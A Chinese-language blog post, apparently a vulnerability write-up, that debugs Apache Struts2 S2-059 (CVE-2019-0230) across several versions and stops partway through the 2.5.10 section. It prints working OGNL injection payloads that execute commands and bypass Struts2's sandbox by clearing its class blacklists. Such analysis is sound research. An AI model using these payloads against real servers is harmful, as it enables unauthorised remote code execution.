<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="S2-059 漏洞与不同 Struct2 版本的 Payload 分析"><meta name="keywords" content="Java,Struct2"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>S2-059 漏洞与不同 Struct2 版本的 Payload 分析 | J0k3r's Blog</title><link rel="shortcut icon" href="/img/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?9e8a6ba1f41c0d7b000fcfd73f1c7929";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><link rel="dns-prefetch" href="https://www.google-analytics.com"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-159554347-1', 'auto');
ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞描述："><span class="toc-number">1.</span> <span class="toc-text">漏洞描述：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析："><span class="toc-number">2.</span> <span class="toc-text">漏洞分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Struct-2-3-10-分析"><span class="toc-number">2.1.</span> <span class="toc-text">Struct 2.3.10 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struct-2-3-20-分析"><span class="toc-number">2.2.</span> <span class="toc-text">Struct 2.3.20 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struct-2-5-10-分析"><span class="toc-number">2.3.</span> <span class="toc-text">Struct 2.5.10 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struct-2-5-16"><span class="toc-number">2.4.</span> <span class="toc-text">Struct 2.5.16</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">3.</span> <span class="toc-text">Reference</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center">求知若饥，虚心若愚</div><div class="follow-button"><a href="https://github.com/zhuxianjin">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">46</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">44</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/wallhaven-j5k275.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/links/">友链</a><a class="site-page" href="/about/">关于我</a></span></div><div id="post-info"><div id="post-title">S2-059 漏洞与不同 Struct2 版本的 Payload 分析</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-14</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p> 2020.08.13 由官方发出安全通告</p>
<a id="more"></a>
<h2 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h2><p>Apache Struts 2 会对某些标签属性（比如 id）的属性值进行二次表达式解析，因此在某些场景下将可能导致远程代码执行。</p>
<p>此问题仅适用于当在 Struts 标签属性内强制进行 OGNL 表达式解析时的情况</p>
<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-007" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-007</a></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:url <span class="keyword">var</span>=<span class="string">"url"</span> namespace=<span class="string">"/employee"</span> action=<span class="string">"list"</span>/&gt;&lt;s:a </span><br><span class="line">id="%&#123;skillName&#125;" href="%&#123;url&#125;"&gt;List available Employees&lt;/s:a&gt;</span><br></pre></td></tr></table></figure>
<p>如果攻击者能够在请求中控制 <code>skillName</code> 属性值且应用未对其进行检查校验，则攻击者可以直接传入一个 OGNL 表达式，那么最终当标签渲染的时候，<code>skillName</code> 的表达式就会因为二次解析而被执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">影响：</span><br><span class="line">Struts 2.0.0 - Struts 2.5.20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">解决：</span><br><span class="line">升级到 Struts 2.5.22</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p>该漏洞在昨天也就是 2020.08.13，由官方发出安全通告，声明对其存在的一个远程代码执行漏洞进行修复</p>
<p>CVE 编号为 CVE-2019-0230</p>
<p>看到这个漏洞的时候，因为最近刚好在调试分析 struct2 的一些历史漏洞，所以想到了最开始的 s2-001，在 s2-001 中漏洞产生的原因就是递归解析表达式，s2-059 也是二次解析，那么有什么不同呢，下面简单分析下</p>
<h3 id="Struct-2-3-10-分析"><a href="#Struct-2-3-10-分析" class="headerlink" title="Struct 2.3.10 分析"></a>Struct 2.3.10 分析</h3><p>paylaod：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
<p>根据漏洞描述简单新建个环境</p>
<p>定义一个 action</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.j0k3r.s2059.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">IndexAction</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>structs.xml 配置 action</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"s2059"</span> <span class="attr">class</span>=<span class="string">"top.j0k3r.s2059.action.IndexAction"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>/pages/s2059/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>index.jsp</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;S2-059&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-059 Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-059"</span>&gt;https:<span class="comment">//cwiki.apache.org/confluence/display/WW/S2-059&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;s:url var="url" namespace="/" action="s2059?name=j0k3r"/&gt;&lt;s:a id="%&#123;name&#125;" href="%&#123;url&#125;"&gt;demo&lt;/s:a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>web.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>/pages/s2059/index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里 struts2-core 版本使用的是 2.3.1，后面 2.5.x 版本禁止访问 context.map，而且黑名单成了不可变集合，不同的 struct 版本，payload 也是不同的</p>
<p>先传入一个 <code>%{11-1}</code> 测试下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/s2059.action?name=%25%7B11-1%7D</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814122444370.png" alt="image-20200814122444370"></p>
<p>可以看到成功解析了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;&#125;)).start()&#125;</span><br></pre></td></tr></table></figure>
<p>下断点 debug，看下流程走向</p>
<p>当解析 JSP 的时候 来到 struts2-core-2.3.1.jar!/org/apache/struts2/views/jsp/ComponentTagSupport.class 的 doStartTag 方法</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814123221625.png" alt="image-20200814123221625"></p>
<p>继续跟进直到 struts2-core-2.3.1.jar!/org/apache/struts2/components/UIBean.class 的 evaluateParams 方法，后面调用了 populateComponentHtmlId 方法，跟进</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814123542144.png" alt="image-20200814123542144"></p>
<p>还是位于 UIBean 中，可以看出，这个 id 就是我们输入的 paylaod，也就是设置的 id 的值，再继续跟进 findStringIfAltSyntax</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814123731379.png" alt="image-20200814123731379"></p>
<p>判断之后会通过 struts2-core-2.3.1.jar!/org/apache/struts2/components/Component.class 的 findString 方法进行处理</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814124348163.png" alt="image-20200814124348163"></p>
<p>Component 调用 findValue 方法，这是能看到熟悉的 translateVariables 方法，在 s2-001中就是该方法递归解析 <code>%{}</code> 导致执行用户输入的恶意 ognl 表达式</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814124425403.png" alt="image-20200814124425403"></p>
<p>看下 translateVariables 方法</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814150656156.png" alt="image-20200814150656156"></p>
<p>添加了 loopCount 判断解析层数，防止二次解析，获取我们输入的 ognl 表达式内容后，再看后面 findValue 处理</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814150925954.png" alt="image-20200814150925954"></p>
<p>在往后交给会由 OgnlUtil.getValue 处理表达式，导致代码执行</p>
<p>上面流程是由 doStartTag 开始分析的，而 doStartTag 执行完后，会来到 doEndTag 方法</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814151425476.png" alt="image-20200814151425476"></p>
<p>来到 evaluateParams 方法，位于 struts2-core-2.3.1.jar!/org/apache/struts2/components/UIBean.class</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814151609633.png" alt="image-20200814151609633"></p>
<p>能看出，下面还会在调用一次 populateComponentHtmlId 方法</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814151709366.png" alt="image-20200814151709366"></p>
<p>所以会执行两次</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814151750196.png" alt="image-20200814151750196"></p>
<h3 id="Struct-2-3-20-分析"><a href="#Struct-2-3-20-分析" class="headerlink" title="Struct 2.3.20 分析"></a>Struct 2.3.20 分析</h3><p>直接来到 xwork-core-2.3.20.jar!/com/opensymphony/xwork2/util/OgnlTextParser.class 的 evaluate 方法，取出表达式内容交给 evaluator.evaluate </p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814155614227.png" alt="image-20200814155614227"></p>
<p>往下跟进 evaluate  方法</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814155855075.png" alt="image-20200814155855075"></p>
<p>一路跟进来到 xwork-core-2.3.20.jar!/com/opensymphony/xwork2/ognl/OgnlValueStack.class 的 getValue 方法</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814160123938.png" alt="image-20200814160123938"></p>
<p>但是往下 getValue 完了也没有执行命令，在回来深入 getValue 一路跟到 xwork-core-2.3.20.jar!/com/opensymphony/xwork2/ognl/OgnlUtil.class 的 compileAndExecute</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814160939410.png" alt="image-20200814160939410"></p>
<p>再一路跟进来到 ognl-3.0.6.jar!/ognl/Ognl.class 的 getValue 方法，执行表达式</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814161113050.png" alt="image-20200814161113050"></p>
<p>后面由于 access denied 无法执行此 paylaod</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814161855485.png" alt="image-20200814161855485"></p>
<p>尝试调用静态方法执行命令</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814181114450.png" alt="image-20200814181114450"></p>
<p>在 xwork-core-2.3.20.jar!/com/opensymphony/xwork2/ognl/SecurityMemberAccess.class 的 isClassExcluded 方法中能看出 this.excludedClasses 就是一个 class 黑名单，如果我们的 class 与其中的 class 相同或是其子类或接口就会返回 true，导致上面的 isAccessible 方法最终返回 false</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200814184624042.png" alt="image-20200814184624042"></p>
<p>回到 ognl-3.0.6.jar!/ognl/OgnlRuntime.class  的 callAppropriateMethod 方法，结果最终抛出一个 NoSuchMethodException，于是 callStaticMethod 失败，无法执行命令</p>
<p>那么怎么才能绕过呢，先看下 struct2 黑名单的产生过程</p>
<p>struct2 在一开始 createValueStack 创建 ognl ValueStack，接着通过 container.inject(stack) 将依赖项注入现有的字段和方法</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200817113249177.png" alt="image-20200817113249177"></p>
<p>通过这个注入操作，会使用 xwork-core-2.3.20.jar!/com/opensymphony/xwork2/ognl/OgnlValueStack.class 的 setOgnlUtil 方法添加黑名单</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200817105223424.png" alt="image-20200817105223424"></p>
<p>内容如下</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200817105206499.png" alt="image-20200817105206499"></p>
<p>那我们在哪修改呢，早在开始创建 OgnlValueStack 的时候，调用 Ognl.createDefaultContext，传入了 securityMemberAccess</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200817113939491.png" alt="image-20200817113939491"></p>
<p>随后又调用 ognl-3.0.6.jar!/ognl/Ognl.class 的 addDefaultContext 方法，新建一个 OgnlContext，通过 setMemberAccess 方法设置 Context 中的 MemberAccess</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200817114155492.png" alt="image-20200817114155492"></p>
<p>看下 ognl-3.0.6.jar!/ognl/OgnlContext.class 的 setMemberAccess，即赋值给了  <code>_memberAccess</code></p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200817114226575.png" alt="image-20200817114226575"></p>
<p>而 SecurityMemberAccess 又继承了 DefaultMemberAccess ，也就是说各黑名单和设置项存于上下文中的  <code>_memberAccess</code>，知道这一点就知道 paylaod 该怎怎么绕过了，首先通过设置 <code>_memberAccess[&#39;allowPrivateAccess&#39;]</code> 授权访问 private 方法，再修改 excludedClasses、allowStaticMethodAccess，然后执行命令</p>
<p>2.3.20 Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#_memberAccess[&apos;allowPrivateAccess&apos;]=true,#_memberAccess[&apos;excludedClasses&apos;]=#_memberAccess[&apos;acceptProperties&apos;],#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;id&apos;).getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200817120016497.png" alt="image-20200817120016497"></p>
<h3 id="Struct-2-5-10-分析"><a href="#Struct-2-5-10-分析" class="headerlink" title="Struct 2.5.10 分析"></a>Struct 2.5.10 分析</h3><p>前期流程差不不是很大，还是来到 populateComponentHtmlId 方法，进入 findStringIfAltSyntax，如果开启了 altSyntax，下面开始 findValue 处理</p>
<p>调用栈如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">compileAndExecute:371, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">getValue:357, OgnlUtil (com.opensymphony.xwork2.ognl)</span><br><span class="line">getValue:360, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">tryFindValue:348, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">tryFindValueWhenExpressionIsNotNull:323, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">findValue:307, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">findValue:368, OgnlValueStack (com.opensymphony.xwork2.ognl)</span><br><span class="line">evaluate:156, TextParseUtil$1 (com.opensymphony.xwork2.util)</span><br><span class="line">evaluate:49, OgnlTextParser (com.opensymphony.xwork2.util)</span><br><span class="line">translateVariables:166, TextParseUtil (com.opensymphony.xwork2.util)</span><br><span class="line">translateVariables:109, TextParseUtil (com.opensymphony.xwork2.util)</span><br><span class="line">translateVariables:82, TextParseUtil (com.opensymphony.xwork2.util)</span><br><span class="line">findValue:377, Component (org.apache.struts2.components)</span><br><span class="line">findString:223, Component (org.apache.struts2.components)</span><br><span class="line">findStringIfAltSyntax:320, Component (org.apache.struts2.components)</span><br><span class="line">populateComponentHtmlId:998, UIBean (org.apache.struts2.components)</span><br></pre></td></tr></table></figure>
<p>一直到 compileAndExecute 都没有问题，但是接下来调用 checkEnableEvalExpression -&gt;isEvalExpression 之后 return 语句当中的 node.isSequence 发现不同的 paylaod IDEA 跟进的函数不同（前面的调用栈相同）</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/java-1.png" alt="java-1"></p>
<p>isEvalExpression 函数</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/struct2-note.assets/image-20200817161324768.png" alt="image-20200817161324768"></p>
<p>当使用下面 paylaod 时，无法执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%7B(%23_memberAccess%5B&apos;allowPrivateAccess&apos;%5D%3Dtrue%2C%23_memberAccess%5B&apos;excludedClasses&apos;%5D%3D%23_memberAccess%5B&apos;acceptProperties&apos;%5D%2C%23_memberAccess%5B&apos;allowStaticMethodAccess&apos;%5D%3Dtrue%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&apos;%2FApplications%2FCalculator.app%2FContents%2FMacOS%2FCalculator&apos;).getInputStream()))%7D</span><br></pre></td></tr></table></figure>
<p>跟进的 isSequence 函数为 ognl-3.1.12.jar!/ognl/ASTSequence.class 中的  isSequence</p>
<pre><code>public boolean isSequence(OgnlContext context) {
    return true;
}
</code></pre><p>而当使用下面 paylaod 时，该 paylaod 能绕过限制，执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,&apos;id&apos;&#125;).(#p=new java.lang.ProcessBuilder(#cmd)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
<p>跟进的 isSequence 函数为 ognl-3.1.12.jar!/ognl/SimpleNode.class 中的 isSequence</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public boolean isSequence(OgnlContext context) throws OgnlException &#123;</span><br><span class="line">    if (this._children == null) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        Node[] arr$ = this._children;</span><br><span class="line">        int len$ = arr$.length;</span><br><span class="line"></span><br><span class="line">        for(int i$ = 0; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">            Node child = arr$[i$];</span><br><span class="line">            if (child instanceof SimpleNode &amp;&amp; ((SimpleNode)child).isSequence(context)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那是为什么呢，其实仔细观察之后能发现两者的不同</p>
